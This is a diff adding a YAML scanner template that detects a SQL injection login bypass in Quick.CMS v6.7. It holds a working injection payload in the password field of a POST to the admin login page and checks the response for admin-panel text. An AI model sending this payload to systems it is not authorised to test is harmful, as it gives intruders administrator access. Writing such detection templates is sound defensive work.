@@ -1,0 +1,30 @@
+id: quick-cms-sqli
+brief:
+    title: Quick.CMS v6.7 - SQL Injection
+    by: s4e-io
+    level: high
+    about: Quick.CMS version 6.7 suffers from a remote SQL injection vulnerability that allows for authentication bypass.
+    label:
+        - packetstorm
+        - quickcms
+        - sqli
+        - cms
+        - vuln
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/admin.php?p=login'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: sEmail=test%40test.net&sPass=%27+or+1%5D%2500&bAcceptLicense=1&iAcceptLicense=true
+      signs:
+        - "on": word
+          has:
+            - Log out</a>
+            - Settings</a>
+            - Plugins</a>
+          in: body
+          need: all
+        - "on": status
+          status:
+            - 200
